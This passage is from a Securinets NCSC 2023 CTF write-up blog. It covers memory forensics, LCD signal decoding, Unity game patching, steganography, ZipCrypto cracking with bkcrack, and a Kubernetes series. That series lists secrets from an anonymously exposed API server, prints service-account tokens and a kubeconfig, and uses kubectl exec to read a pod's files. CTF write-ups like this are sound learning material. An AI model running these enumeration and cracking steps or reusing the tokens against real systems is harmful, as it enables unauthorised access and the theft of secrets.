to open the zip and get the flag! \n\nAnd It's time to investigate the `mstsc.exe` or let's just say the RDP! Remote Desktop?? Mmmm how to extract information from that thing?\n\nLet's talk brievly! Extracting the memory part used by RDP can save our life! I'll try to recover what the user see when he used RDP!!!! \n\nYes this possible dear reader, Don't worry You'll see how! Just make sure that you have `Gimp`\n\nLet's now extract the memory part used by RDP process using the `memdump` plugin in volatility! \n\n``` bash memdump\nvol.py -f memory.dmp --profile=Win7SP1x64 memdump -p 360 -D .\nVolatility Foundation Volatility Framework 2.6.1\n************************************************************************\nWriting mstsc.exe [   360] to 360.dmp\n```\n\nAfter getting that file! Let's change its extension from `.dmp` to `.data` and open that file with gimp! \n\n![](https://i.imgur.com/k3uwJ0M.png)\n\nNow it's time for focusing! Yeah focusing will save your time! Many people can't figure or recover images quickly! But believe me focusing on the noise will help you recover the data in a short time! \n\nAfter 4 mins of playing with offset and width i got it! \n\nCheck the offset and the width!\n\n![](https://i.imgur.com/wI2SQK7.png)\n\nOhhh man! The user was opened [https://ctf.securinets.tn](https://ctf.securinets.tn) (check it for know more information about our CTFs events xD ) and tried to secure a zip file with that shitty password! \n\nFinally This is the flag `Securinets{R3M0tE_DeSKtOp_1s_FunNy_!_!}`\n\n# Hardware: Liquid Display\n\n![](https://i.imgur.com/YVrQJqG.png)\n\nWe got an image and a data file! \n![](https://i.imgur.com/5Enx08x.png)\n\nThe image contains an LCD 16x2 SPI connected to something called `WOKWI LOGIC`\n\nAfter some searching I got that this component is a logic analyzer. But wait!! What is that?? \n\nA logic analyzer is an electronic instrument that captures and displays multiple signals from a digital system or digital circuit. A logic analyzer may convert the captured data into timing diagrams, protocol decodes, state machine traces...\n\n![](https://imgur.com/WEzP4bO.png)\n\nAs my friend said this is the hardware wireshark xD\n\nSo we can understand now that this circuit capture the signals of each pin of the LCD and the data file is the capture file that contains the files! \n\nSo after some searching we get how to open that data file (which is a ASCII text file, I didn't recommend to analyse it as text file).\n\nYou can check this [link](https://docs.wokwi.com/guides/logic-analyzer) to get more information about the logic analyzer! \n\n[PulseView](https://sigrok.org/wiki/Downloads) is an open source Logic Analyzer GUI belongs to The sigrok project that aims at creating a portable, cross-platform, Free/Libre/Open-Source signal analysis software suite that supports various device types\n\nI'll use that Logic Analyzer GUI for this challenge! \n\n![](https://imgur.com/6HyLxUY.png)\n\nImport the file data in this way! and let's the show begin! \n\n![](https://imgur.com/MLrvWUk.png)\n\nA lot of fun wait us right?! Don't worry man! This is not that super hard! Just all what we need to do now is to simulate these signals manually! These signals are sent to the LCD and that LCD display something (It should be the flag!). So we need to understand how LCD works! I recommend to read the datasheet this thing!\n\nI will not re-write what the datasheet said! so read it! You should understand how the LCD dispaly chars! \n\n![](https://imgur.com/vnZLXyb.png)\n\nAlso don't forget to check the instruction table and understand how these instruction works! \n\n![](https://imgur.com/xsRciDM.png)\n\nLet's just take an example of the 1st instruction! The `Clear Display`. This instruction clear all the data and return the cursor to the original status! Ah yeah of course you must to understand that LCD have cursors, display modes ... \n\nAfter understand how this LCD works it's time to check how characters are written on that LCD!\n\n![](https://imgur.com/5JQEtHj.png)\n\nThis table will help us to convert the signals to chars and recover our flag! \n\nAfter reading the datasheet. You will understand that the D0 (that correspond to RS pin) can help you to understand when the display device clear the chars and reset the cursor or write something on the screen!\n\n![](https://imgur.com/QTfwCZC.png)\n\nIf you take a closer look you'll get it! The guy who write the program write something and clear it then write another thing then delete it and so on! \n![](https://imgur.com/GSgaCKF.png)\n\nSo now it's time to check the write blocks and check what that guy try to do! After reversing all the block i got the flag! It's on the last block! Let me show you how I recover that data! \n\n![](https://imgur.com/HZcwRyX.png)\n\nUsing the characters table you can recover the flag! Mapping the signal and the Big table lead you to the flag!\n\nAnd This is will be our flag! `Securinets{LcD_1s_H4rD_!:(}`\n\n# Game Hacking: Platformer:\n![](https://imgur.com/OAyXmNQ.png)\n\nIn this challenge we have a game made by unity! It's 2D platformer game where the player can jump and run in the map! But where is the flag??\n![](https://imgur.com/oIzwhG8.png)\n\nMmmmm my sixth sense told me that the flag is hidden somewhere in the map and the player can't reach it! Hack Time!!! \n\nLet's change the player ability and let him can move in any place we want it. By disabling the collision and physics mechanism! Good bye gravitiy,Rigidbody,collisions! \n\nTo do this let's open `Assembly-CSharp.dll` located in `Platformer_Data/Managed` folder.\n\nWow! This is the player controller code! that allow the player to move and the animation to be played and responsable for jumping and detect ground detection to deny player to jump many times on the air! \n\n![](https://imgur.com/eD0vAq0.png)\n\nBoring mechanism!! Let me change this shitty code by mine! I'll let the player move to any point he want! \n\n\n![](https://imgur.com/DZqPB6p.png)\nYou can copy that code\n\n```csharp change mechanism\n\tprivate void Start()\n\t{\n\t\tthis.rb = base.GetComponent<Rigidbody2D>();\n\t\tthis.rb.isKinematic = true;\n\t\tthis.anim = base.GetComponent<Animator>();\n\t\tthis.mySpriteRenderer = base.GetComponent<SpriteRenderer>();\n\t}\n\n\t// Token: 0x06000005 RID: 5\n\tprivate void FixedUpdate()\n\t{\n\t\tfloat axisRaw = Input.GetAxisRaw(\"Horizontal\");\n\t\tfloat verticalInput = Input.GetAxisRaw(\"Vertical\");\n\t\tVector3 movement = new Vector3(axisRaw, verticalInput, 0f).normalized * 10f * Time.deltaTime;\n\t\tbase.transform.Translate(movement);\n\t}\n```\n\nAfter applying the changes our player can now go to any place we want! But i didn't find the flag! Oh god! This is what i found!\n![](https://imgur.com/6PRgDFo.png)\n\nI checked all the map and sadly nothing interesting :( \n\nLet's check the files again! Maybe we will find something!\n\n![](https://imgur.com/MZ9tbCH.png)\n\nOh man look here! I found that there is levels on this game! Let me back to the decompiled code! \n\n![](https://imgur.com/yM0C7nL.png)\n\nOh no! The game is opened on the 2nd level! Let's change this room to \"Level1\" and Play again! And yes It's a new Level\n\n![](https://imgur.com/me4efrx.png)\n\nAfter moving right and left, I found the flag! \n\n![](https://imgur.com/gj4wGE9.png)\n\nAnd Yes We did it! Just move right and left and collect the letters ! and you'll get this one ! Wrap it in Securinets{}\n![](https://imgur.com/cpA2O6c.png)\n\nFlag: `Securinets{Gam1ng_AnD_L0VE}`\n\n# Misc: Full Difference\n\n![](https://imgur.com/dROW4SQ.png)\n\nFull Difference, The difference will make a difference! What is that thing ?? we got 2 images with different type but same picture! \n![](https://imgur.com/dr87PxX.png)\n\nThinking a little bit can we understand what the author means! Full difference! It means that the pixels should be different a full difference! which means the Red,Green and Blue channels should be differents! \n\n\"Will make a difference!\" After extracting the different pixels we should calculate the difference between each channels ?? Mmmmm makes sense! \n\n```python solver\nfrom PIL import Image\nimport string \nim1=Image.open(\"tobi.jpg\")\nim2=Image.open(\"tobi.png\")\npix2=im2.load()\npix1=im1.load()\nwidth,height=im1.size\nresult=\"\"\ndata=[]\nfor i in range(0,width):\n    for j in range(0,height):\n        if pix1[i,j] != pix2[i,j] and pix1[i,j][0] != pix2[i,j][0] and pix1[i,j][1] != pix2[i,j][1] and pix1[i,j][2] != pix2[i,j][2]:\n            for k in range(0,3):\n                data.append(chr(abs(pix1[i,j][k] - pix2[i,j][k])))\n\nfor char in data:\n    if char in string.ascii_letters + string.digits + string.punctuation:\n        result+=char\n\n        \nprint(result)\n```\n\nSo the logic behind that code is to extract the pixels that have a full difference then calculate the difference between them. After that we convert the numbers to chars (should be printable!)\n\nThis expression will give us the different pixels \n```python exp\npix1[i,j] != pix2[i,j] and pix1[i,j][0] != pix2[i,j][0] and pix1[i,j][1] != pix2[i,j][1] and pix1[i,j][2] != pix2[i,j][2]\n```\nIn addition this expression collect the result of calculation the diff between the 2 pixels of each image!\n\n```python diff\ndata.append(chr(abs(pix1[i,j][k] - pix2[i,j][k])))\n```\n\nThen it's time to convert it to printable data! \n```python print\nfor char in data:\n    if char in string.ascii_letters + string.digits + string.punctuation:\n        result+=char\n```\nRunning this code will give you this base64 encoding! `dGgxNV8xNV9zaDB1TGRfYjNfaDRyRA==`\n\nBingo we got this statement! `th15_15_sh0uLd_b3_h4rD`. Let's wrap it in Securinets! Oh nooo! Didn't work. I guess the challenge is not finished! \n\nWe have 2 images! PNG and JPEG. Mmmm Let's try to do some steganography on these images using the password/key that we got previously.\n\nThe 1st idea in my mind is to try steghide! Nothing else! Let's try it \n\n![](https://imgur.com/VLbBAGf.png)\n\nYEEES MAAN! We got a flag.zip file! But wait it's protected again :(. I tried to brute force that thing using rockyou but failed !!! What is going on here! The flag is inside that zip what we should to do now! \n\nLet's extract more information about the zip using `7z` utility\n```bash 7z\n7z l  -slt flag.zip\n\nPath = flag.txt\nFolder = -\nSize = 40\nPacked Size = 52\nModified = 2022-11-18 21:17:23\nCreated =\nAccessed =\nAttributes = A\nEncrypted = +\nComment =\nCRC = 4F639BBA\nMethod = ZipCrypto Store\nHost OS = FAT\nVersion = 20\nVolume Index = 0\n```\n\nNice the flag.txt size is 40 bytes! So our flag is 40-chars strings! The encryption method is `ZipCrypto`!\n\nBingoo! This method is vulnerable! Let's check how can we get our flag!\n\nAfter some searching we found a repository talking about \"Crack legacy zip encryption with Biham and Kocher's known plaintext attack.\"\n\n\nI recommend to check this [repo](https://github.com/kimci86/bkcrack) and understand how this attack can be manipulated and how to install that tool! \n\nLet's now start downloading the tool \n\n```bash wget\nwget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz\n```\nWe need to recover the internal key that will allow us to extract the file! \n\nThe attack requires at least 12 bytes of known plaintext. At least 8 of them must be contiguous. The larger the contiguous known plaintext, the faster the attack. In our case we have a flag.txt that contains `Securinets{*}`\n\nIn our case we know 11 chars (`Securinets{`) and the last char `}`\n\nLet's recover our key now! \n\n```bash prepare our data\necho -n \"Securinets{\" > plaintext.txt\necho -n \"}\" | xxd # 7d is the result\n```\n\nThe attack requires the plain text content and in case there is another seperate bytes we can specify the offset and the byte value in hex \n\nNow time to work !\n```bash get the key\nbkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -p plaintext.txt -x 39 7d \n\nbkcrack 1.5.0 - 2022-07-07\n[16:21:19] Z reduction using 4 bytes of known plaintext\n100.0 % (4 / 4)\n[16:21:19] Attack on 1405963 Z values at index 6\nKeys: 184a904b d4557686 2222c7f2\n9.2 % (129555 / 1405963)\n[16:24:40] Keys\n184a904b d4557686 2222c7f2\n```\nWe got the keys ! `184a904b d4557686 2222c7f2`. Now we can decipher/decrypt the file! which means extract it from the zip! \n\n```bash extract \nbkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -k 184a904b d4557686 2222c7f2 -d my_flag.txt   \n\nbkcrack 1.5.0 - 2022-07-07\n[16:32:25] Writing deciphered data my_flag.txt (maybe compressed)\nWrote deciphered data.\n```\nBingo We got the flag!!! How 2 images can hide data like that! \n\n![](https://imgur.com/O8uXhZV.png)\n\nFlag: `Securinets{Z1p_CRyPt0_&_5t3gH1d3_1s_BAd}`\n\n# Kubernetes challenge serie\n\nNCSC'2023 consider the 1st tunisian CTF competition that have a whole Kubernetes Category! These are oriented for beginners/Intermediate users to consodilate their basic knowledge in Kubernetes!\n\n![](https://imgur.com/U69KQtM.png)\n\n## Kubernetes: Secrets:\nIn this challenge we get an IP and the author told us that he have a secret in the cluster! \n![](https://imgur.com/PCmO273.png)\n\nVisiting the IP on the browser will lead us to the author page! This is not our objective! \n\nWe need to access to the API-Server. Let's check the default port 6443\n\n```bash curl\ncurl -sk https://20.169.73.19:6443/version\n```\nAnd this request is failed! Mmmm The author change the default api-server?? Nmap time! Let's scan that IP! \n\nAfter checking the IP we get that port opened 7443! \n\n![](https://imgur.com/GunNYhA.png)\n\nAnd Yes! We got a response! It's KUBERNETES TIME!! \n\nLet's check what permission we have as an anonymous users! To be honest I'll try to check if I can got namespaces Or secrets first! Let me check that! \n\n```bash curl-namespaces\ncurl -sk https://20.169.73.19:7443/api/v1/namespaces | grep '\"name\": \"'\n```\nAnd we got a list of namespaces! This is cool! We have `task1,task2,task3 and task4` namespaces! I bet that each challenge is in single namespace! This is Great! \n![](https://imgur.com/vZrtZLd.png)\n\nHummm We need secrets and this is the 1st challenge! So We are sure that we can list the secrets in the `task1` namespace! \n\n```bash curl-namespaces\ncurl -sk https://20.169.73.19:7443/api/v1/namespaces/task1/secrets\n```\nBingo We got the Secrets List! We are on the right way! \n![](https://imgur.com/0PFJsCI.png)\n\nFlag : `Securinets{S3crEts_Ar3_S0_CriT1c4LL}`\n\n> We got a message! We must check it for sure! \n\nLook what we got here ! \n\n```text check\nLook here YOU will need this one believe me!!!\n eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg\n```\n\n## Kubernetes: Pody:\n\nAfter getting the secrets we can move to the next challenge that named `Pody`\n\n![](https://imgur.com/hZQya2W.png)\n\nIn this challenge the author told us that the container is inside a pod! So how can we get inside that pod? Thinking a little bit we didn't get any solution expect opening a shell session inside the pod! \n\nKubectl Are you there?? Yes! It's Kubectl time! I love to work with kubectl I will not waste my time curling endpoints :) So I'll make my kubeconfig file for this challenge! \n\nWhen I checked the secrets in the previous challenge I got the certificate authority Certifcate. And of course don't forget the token that we got! \n\n> This token is used for authentication and authorization in kubernetes. This authorization is occur on the api-server level not the etcd! \n\nLet's make our kubeconfig! But wait! In case you don't have kubectl, it's time to install it! You can follow this [guide](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/) to install it\n\n```yaml kubeconfig\napiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority-data:  LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1ETXdOVEV5TWpVMU1sb1hEVE16TURNd01qRXlNalUxTWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTDEzCm0rOG5ySVlXU21hQjREMU9yWWJVS1hycE4rS2ZUZDk1TjA2UTQ5U3IyUU1FZkZXZHhjSGJadThRVWRIVXo1dFcKdmVvRnk4cFBpcmhhNHdGYnJEbXczdFp4NlgxbGxEZlp4b29jd1ZBOS9pMTBjNGE4TURvOGVuc1hlYWU1TytZcQpMZmdiM04zcWZYYjZmSHAzekwxeHJzWThPUEZVeHhmU3AxaElXa0RNZ0tZY0lhU2NoRVUzYTk0ZityY2tIOUFwCnltRi95TlB3bXgyU1RFZUVFSkZoZFdWUzVVamdSTmxnNzFPWklyb05DMXMzWEJxb2RiZ1FWUjBUeTI5bnJGc0QKQnBJQW1WQVRCS3QxTjcyRjRMRDA0c3M3QVUxU0NDSCtoUmlrTWE1ZkdtOTBjMWRacEVuZ1IyVEUwSzZ4WVY3TAplOElrcE5WOVBaLy9RT2ZqSnFFQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZBWWUzVktNRDY3T3V5NWhWTGxTN0RWeU52SExNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBSE9EMUNTNGQzNjJLRXE1dTZyQwpQOEF6a3hDMTJDdVF1bDh4aUVTajZ4M25wb25oT2M3WU0zRUhQZk5wNHRDZmNsdFpDMU51SXNrVDRuSkRLRTFYCjRNVFNOL0kxVDlGSHd5SUhNbDZMZm1RL1ZLVlo1YlZJMEZlUENQanFnOWZSbHFYaitsRUxJQnRJVE0xbUlmeW0KZlZmMisrS3h4OTFTME54bWRKUzU0amY1SUJMRVh2SnRiWFYrblZ1ekhER3l5eDREblVDMm4zR3NrcEtBOGRJRQpZZktRWk5IZjJ4L0FySWM2a3A0em9TSWI1RVQvdDk4b3p5R2pldlVnbDd1L0orUzkwTS9pWWgyaGlGSXRRVE1WCnBTa0pQM1lIbDlzWVRSS0dXZTBtcEtnVm1RZm9VTVNzdURrRnZ4ZFNhVG9QQUN6aUdxdUNnVXVyWHMxNXJjOWkKR2xBPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==\n    server: https://20.169.73.19:7443\n  name: raf-k8s\ncontexts:\n- context:\n  name: ncsc-sa@raf-k8s\n  context:\n    cluster: raf-k8s\n    user: ncsc-sa\ncurrent-context: ncsc-sa@raf-k8s\nusers:\n- name: ncsc-sa\n  user:\n    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg\n```\nThis kubeconfig file will allow us to authenticate to the api-server using kubectl utility without wasting time specifying the token and other stuff!\n\nAssume that you save that file in name `ncsc-k8s.conf`. Let's export the KUBECONFIG env var.\n\n```bash\n$ export KUBECONFIG=ncsc-k8s.conf\n$ kubectl get pods -n task2 \nNAME      READY   STATUS    RESTARTS        AGE\nweb-app   1/1     Running   3 (2d19h ago)   17d\n```\nBingo !! We got access and everything is ok until now. Let's describe the pod and check what we have first before getting a shell !\n\n```bash describe pod\nkubectl describe pod web-app -n task2   \nName:             web-app\nNamespace:        task2\n...\n...\n    Mounts:\n      /etc/nginx/flag.txt from flag-configmap (rw,path=\"flag.txt\")\n      /var/cache/nginx from tmpfs-2 (rw)\n      /var/run from tmpfs-1 (rw)\n      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-wrfpc (ro)\n...\n```\nWow there is `flag.txt` file inside the pod! Let's be more accurate! The flag is in `/etc/nginx/flag.txt`\n\nLet's get a shell or run a command from the pod using the `kubectl exec` command! \n\n![](https://imgur.com/6QTqehO.png)\n\nYes we got the flag! And another message: Your current token is enough! \n\n> I tried to delete the flag! But as expected the author make the pod Read-only file system\n\nFlag : `Securinets{Ex3c_1s_DAnGer0uS_B3_C4r3fUL}`\n\n## Kubernetes: Hidden? :\n\nWe still have the same token! Our kubectl works fine. So no worries we can do it! \n\n![](https://imgur.com/1Eny78d.png)\n\nIn this challenge the flag is hidden?? But how!? Let's check first what can we do in our `task3` namespace\n\n```bash service\nkubectl get service -n task3        \nNAME      TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE\nweb-app   ClusterIP   10.109.128.98   <none>        80/TCP    17d\n```\nWe can access to services! In case you don't know what is service I recommend to check this [page](https://kubernetes.io/docs/concepts/services-networking/service/). As we understand, There is a pod inside task3 namespace but we don't have any access to it :(!. No worries we still have services! This service as we can see its attached to that pod. Let's get our flag! \n\nAfter a little bit of thinking, I got an idea! Let's access to the service from our previous pod! \n\nYES MAN! pods and services can communicate between each others \n\n![](https://imgur.com/uq3xAoV.png)\n\nOk let's do it then, we have the service internal IP and we can run curl command inside our previous pod! \n\n![](https://imgur.com/DuPq2Sp.png)\n\nBingo! Flag: `Securinets{K8s_S3rV1cEs_ArE_P0wErFull}`\nAnd as Usual! another token for the next challenge :\n```text \nIn The Next Challenge You will Need This one!\n eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJuY3NjLXBhcnRpY2lwYW50LXRva2VuLTdnZ2JxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Im5jc2MtcGFydGljaXBhbnQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwNmM3OGJhZC01NjAwLTQ2N2QtYjdhYi0wNWQzN2RjMjg0MzIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazQ6bmNzYy1wYXJ0aWNpcGFudCJ9.exWa8skN0HdscxzG2PBFYn9eU9l_sL7hAjUw8sFPsnjUKHPHzmqwDpN4WfSPCHFOfv7KKimYvr9SuMjB75KuapxXKnyBwEaIZEkH3c0lavBCPYfGou_BrVsAHVSdbw6pQ9YYonuc3WTiGkcXC-XjKXfY8PGppmnGh7gUsuxY9xwpju10PutjIs8s0g9z2tTBYUhOraa54WRCODDGw-o415rXsaVHuV8A2Cj3jQZVBzXXi5-snfvjX27-nMyGDh4F0gu8sXD3PZfLjLdrOQpP6s_jzbUN9G1g8iLQTXNjCvgUw2cnBOvWtRGLtbdizOazlKUyJAOSXfmu3W45bMJPOg\n```\n## Kubernetes: Special :\n\nAfter getting the new token it's time to edit the kubeconfig file! Just replace the old toke by the new one! To work with kubectl correctly! \n\n![](https://imgur.com/iFClk1V.png)\n\nSomething Special?? What a special? Everything in Kubernetes is SO Special!! So no worries, We can deal with that kind of things!\n\nTalking about something special take me to think about what we can call it `Custom Resources Definition` in Kubernetes!\n\nIn Kubernetes, a custom resource is an extension of the Kubernetes API that allows you to define your own custom resources with their own custom controllers.\n\nA custom resource definition (CRD) is used to create a new custom resource type in Kubernetes. A CRD defines the structure and behavior of the new custom resource, including its name, attributes, and API endpoints. Once a CRD is defined, instances of the custom resource can be created and managed using Kubernetes tools like kubectl and the Kubernetes API.\n\n```bash api-resources\nkubectl api-resources\nNAME                              SHORTNAMES                                      APIVERSION                             NAMESPACED   KIND\nbindings                                                                          v1                                     true         Binding\ncomponentstatuses                 cs                                              v1                                     false        ComponentStatus\nconfigmaps                        cm                                              v1                                     true         ConfigMap\n...\n...\nrolebindings                                                                      rbac.authorization.k8s.io/v1           true         RoleBinding\nroles                                                                             rbac.authorization.k8s.io/v1           true         Role\npriorityclasses                   pc                                              scheduling.k8s.io/v1                   false        PriorityClass\nncscctfs                                                                          securinets.com/v1alpha1                true         NCSCCtf\n```\nBut wait! I am right! There is an api-group and a custom resource called ncscctfs! \n\nNow it's time to get the flag!\n\n```bash get\nkubectl get ncscctfs -n task4           \nNAME   AGE\nflag   17d\n```\nAnd yes there is a ncscctf resource named flag! Let's describe that thing and get the flag! \n\n```bash describe\nkubectl describe ncscctfs flag -n task4 \n```\n\n![](https://imgur.com/DhelAJU.png)\n\nFlag: `Securinets{CuSt0m_REs0urcEs_ArE_P0wErFul}`\n\n# Final Words\n\nIn conclusion, the success of this event and competition is due in no small part to the dedication and hard work of the technical team. Their expertise and professionalism were instrumental in overcoming the various challenges we faced throughout the event lifecycle, and their tireless efforts ensured that we delivered a product that met the highest standards of quality and performance. On behalf of the team, I would like to express our sincere gratitude to our technical colleagues for their unwavering commitment to the project, and for their invaluable contributions to its success","slug":"Writeups/ncsc2023","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxnx000ud5qfazid25x9","content":"<p>The National Cyber Security Congress (NCSC) is a three-day event that brings together cyber security enthusiasts and experts. The event features a wide range of activities, including workshops, talks, conferences, and two exciting CTF competitions.</p>\n<p><img data-src=\"https://imgur.com/LJslRYb.png\" alt=\"\"></p>\n<p>As a technical team member, I had the chance to create challenges in Kubernetes, Digital Forensics, Misc, Hardware, and Game Hacking categories.</p>\n<p>The NCSC CTF provided a unique opportunity for cyber security enthusiasts to demonstrate their problem-solving abilities, teamwork, and technical proficiency in a fun and competitive environment. Overall, the event was an exciting and rewarding experience for all involved.</p>\n<p>In this blog, I will share some write-ups that players have requested!</p>\n<h1 id=\"digital-forensics-mokni-seals\"><a class=\"markdownIt-Anchor\" href=\"#digital-forensics-mokni-seals\">#</a> Digital Forensics : Mokni &amp; Seals</h1>\n<p><img data-src=\"https://i.imgur.com/i231apB.png\" alt=\"\"></p>\n<p>We got a zip file! I bet that file is a memory dump! So i tried to run the volatility imageinfo plugin but it takes a long time. So I tried to figure out if this file is Linux memory dump or not!</p>\n<figure class=\"highlight bash\"><figcaption><span>linux or win ?</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s: strings data.raw | grep <span class=\"string\">&quot;Linux version&quot;</span> </span><br><span class=\"line\">Linux version 5.8.0-43-generic (buildd@lcy01-amd64-018) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils <span class=\"keyword\">for</span> Ubuntu) 2.34) 49~20.04.1-Ubuntu SMP Fri Feb 5 09:57:56 UTC 2021 (Ubuntu 5.8.0-43.49~20.04.1-generic 5.8.18)</span><br></pre></td></tr></table></figure>\n<p>And yes it’s a Linux Memory dump! I guess its time to start finding/making a profile but let me check that is memory dump can be analyzed with a profile or not!</p>\n<figure class=\"highlight bash\"><figcaption><span>checking</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -i insmod       </span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko path=../../Linux64.mem format=raw</span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko <span class=\"string\">&quot;path=../../Linux64.mem format=raw&quot;</span></span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko <span class=\"string\">&quot;path=../../Linux64.mem format=raw&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Oh! The format is ram! which means that even if we get the correct profile volatility can’t analyze this memory dump! Strings time! The author want us to solve this mem dump using strings !</p>\n<p>Let’s try to figure out some command lines! Bash history! Let me show you this trick!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract bash history</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;@*:~\\\\$&quot;</span>     </span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span 